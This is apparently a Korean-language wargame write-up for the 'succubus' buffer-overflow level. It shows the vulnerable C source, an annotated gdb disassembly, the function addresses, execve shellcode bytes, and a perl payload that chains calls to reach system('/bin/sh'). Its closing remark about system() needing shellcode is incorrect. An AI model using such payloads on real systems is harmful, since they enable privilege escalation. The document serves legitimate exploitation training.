zombie-assassin
no place to hide


[zombie_assassin@localhost zombie_assassin]$ cat ./succubus.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - succubus
        - calling functions continuously
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

// the inspector
int check = 0;

void MO(char *cmd)
{
        if(check != 4)
                exit(0);

        printf("welcome to the MO!\n");

        // olleh!
        system(cmd);
}

void YUT(void)
{
        if(check != 3)
                exit(0);

        printf("welcome to the YUT!\n");
        check = 4;
}

void GUL(void)
{
        if(check != 2)
                exit(0);

        printf("welcome to the GUL!\n");
        check = 3;
}

void GYE(void)
{
        if(check != 1)
                exit(0);

        printf("welcome to the GYE!\n");
        check = 2;
}

void DO(void)
{
        printf("welcome to the DO!\n");
        check = 1;
}

main(int argc, char *argv[])
{
        char buffer[40];
        char *addr;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // you cannot use library
        if(strchr(argv[1], '\x40')){
                printf("You cannot use library\n");
                exit(0);
        }

        // check address
        addr = (char *)&DO;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with DO\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // stack destroyer
        // 100 : extra space for copied argv[1]
        memset(buffer, 0, 44);
        memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));

        // LD_* eraser
        // 40 : extra space for memset function
        memset(buffer-3000, 0, 3000-40);
}

도 -> 개 -> 걸 -> 윷 -> 모(system(cmd) 존재)

-----------------------------------------
(gdb) disas main
Dump of assembler code for function main:
0x8048808 <main>:       push   %ebp
0x8048809 <main+1>:     mov    %ebp,%esp
0x804880b <main+3>:     sub    %esp,44

0x804880e <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x8048812 <main+10>:    jg     0x8048830 <main+40>
0x8048814 <main+12>:    push   0x8048a22
0x8048819 <main+17>:    call   0x804844c <printf>
0x804881e <main+22>:    add    %esp,4
0x8048821 <main+25>:    push   0
0x8048823 <main+27>:    call   0x804845c <exit>
0x8048828 <main+32>:    add    %esp,4
0x804882b <main+35>:    nop
0x804882c <main+36>:    lea    %esi,[%esi*1]

0x8048830 <main+40>:    push   64
	-> 64 == '\x40' (내가 까먹고 set disassamble-flavor intel 안함)
0x8048832 <main+42>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048835 <main+45>:    add    %eax,4
0x8048838 <main+48>:    mov    %edx,DWORD PTR [%eax]
0x804883a <main+50>:    push   %edx
0x804883b <main+51>:    call   0x80483dc <strchr>
0x8048840 <main+56>:    add    %esp,8

0x8048843 <main+59>:    mov    %eax,%eax
0x8048845 <main+61>:    test   %eax,%eax
* 어셈블리 test명령어 : 두 operend끼리  AND연산한다.
	-> 위는 그냥 %eax의 결과가 0인지 1인지 여부를 확인하는 작업.
0x8048847 <main+63>:    je     0x8048860 <main+88>

0x8048849 <main+65>:    push   0x8048a2e
0x804884e <main+70>:    call   0x804844c <printf>
0x8048853 <main+75>:    add    %esp,4

0x8048856 <main+78>:    push   0
0x8048858 <main+80>:    call   0x804845c <exit>
0x804885d <main+85>:    add    %esp,4

0x8048860 <main+88>:    mov    DWORD PTR [%ebp-44],0x80487ec
->[%ebp-44]에 주소값 할당(함수 DO의 주소값임.)
0x8048867 <main+95>:    push   4
0x8048869 <main+97>:    lea    %eax,[%ebp-44]
0x804886c <main+100>:   push   %eax
0x804886d <main+101>:   mov    %eax,DWORD PTR [%ebp+12]
0x8048870 <main+104>:   add    %eax,4
0x8048873 <main+107>:   mov    %edx,DWORD PTR [%eax]
0x8048875 <main+109>:   add    %edx,44
0x8048878 <main+112>:   push   %edx
0x8048879 <main+113>:   call   0x804842c <memcmp>
0x804887e <main+118>:   add    %esp,12

0x8048881 <main+121>:   mov    %eax,%eax
0x8048883 <main+123>:   test   %eax,%eax
0x8048885 <main+125>:   je     0x80488a0 <main+152>

0x8048887 <main+127>:   push   0x8048a60
0x804888c <main+132>:   call   0x804844c <printf>
0x8048891 <main+137>:   add    %esp,4

0x8048894 <main+140>:   push   0
0x8048896 <main+142>:   call   0x804845c <exit>
0x804889b <main+147>:   add    %esp,4

0x804889e <main+150>:   mov    %esi,%esi
0x80488a0 <main+152>:   mov    %eax,DWORD PTR [%ebp+12]
0x80488a3 <main+155>:   add    %eax,4
0x80488a6 <main+158>:   mov    %edx,DWORD PTR [%eax]
0x80488a8 <main+160>:   push   %edx
0x80488a9 <main+161>:   lea    %eax,[%ebp-40]
0x80488ac <main+164>:   push   %eax
0x80488ad <main+165>:   call   0x804847c <strcpy>
0x80488b2 <main+170>:   add    %esp,8
-> buffer에 argv[1]을 복사(strcpy())
0x80488b5 <main+173>:   lea    %eax,[%ebp-40]
0x80488b8 <main+176>:   push   %eax
0x80488b9 <main+177>:   push   0x8048a7f
0x80488be <main+182>:   call   0x804844c <printf>
0x80488c3 <main+187>:   add    %esp,8

0x80488c6 <main+190>:   push   44
0x80488c8 <main+192>:   push   0
0x80488ca <main+194>:   lea    %eax,[%ebp-40]
0x80488cd <main+197>:   push   %eax
0x80488ce <main+198>:   call   0x804846c <memset>
0x80488d3 <main+203>:   add    %esp,12
-> memset(buffer,0,44);
0x80488d6 <main+206>:   lea    %eax,[%ebp-40]
0x80488d9 <main+209>:   mov    %edx, 0xbfffff6b
0x80488de <main+214>:   mov    %ecx,%edx
0x80488e0 <main+216>:   sub    %ecx,%eax
0x80488e2 <main+218>:   mov    %eax,%ecx
0x80488e4 <main+220>:   push   %eax
0x80488e5 <main+221>:   push   0
0x80488e7 <main+223>:   lea    %eax,[%ebp-40]
0x80488ea <main+226>:   lea    %edx,[%eax+148]
0x80488f0 <main+232>:   push   %edx
0x80488f1 <main+233>:   call   0x804846c <memset>
0x80488f6 <main+238>:   add    %esp,12
-> memset(buffer+148, 0, 0xbfffff6b-buffer);
	* 0xbfffff6b - buffer = 0xffffffff - buffer - 0x94(DEC : 148)
0x80488f9 <main+241>:   push   0xb90
0x80488fe <main+246>:   push   0
0x8048900 <main+248>:   lea    %eax,[%ebp-40]
0x8048903 <main+251>:   lea    %edx,[%eax-3000]
0x8048909 <main+257>:   push   %edx
0x804890a <main+258>:   call   0x804846c <memset>
0x804890f <main+263>:   add    %esp,12
-> memset(buffer-3000,0,2960);
0x8048912 <main+266>:   leave
0x8048913 <main+267>:   ret
0x8048914 <main+268>:   nop


서브 함수 주소 :
(gdb) print DO
$1 = {<text variable, no debug info>} 0x80487ec <DO>

(gdb) print GYE
$2 = {<text variable, no debug info>} 0x80487bc <GYE>

(gdb) print GUL
$3 = {<text variable, no debug info>} 0x804878c <GUL>

(gdb) print YUT
$4 = {<text variable, no debug info>} 0x804875c <YUT>

(gdb) print MO
$5 = {<text variable, no debug info>} 0x8048724 <MO>

예상 "/bin/sh" 시작주소:
1.
0xbffffa8c

2. (NOP 16byte +쉘코드 )
0xbffffa7c

쉘코드(24):
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

페이로드:
`perl -e 'print "\x90"x40,"AAAA","\xec\x87\x04\x08","\xbc\x87\x04\x08","\x8c\x87\x04\x08","\x5c\x87\x04\x08","\x24\x87\x04\x08","BBBB","\x90"x16,"/bin/sh"'`

*NOP sled
	-> 프로그램이 실행중에 NOP명령어를 만나면 다음 바이트를 확인하게 된다.
	   단, NOP sled가 포함된 문자열을 통해 RET값을 변조하려할때, %eip에 들어가는 값 자체는
	   NOP sled가 되면 안된다, NOP sled가 위치하는 곳을 가리키는(NOP sled끝에 유의미한 데이터가 있을 때)
	   4byte짜리 주소를 RET(나아가 %eip에)넣어야한다.

* system 함수
	-> 쉘을 실행시키고 싶다면 인자로 "/bin/sh"문자열 자체를 넣는게 아니라
	   쉘코드 문자열을 넣어야함.


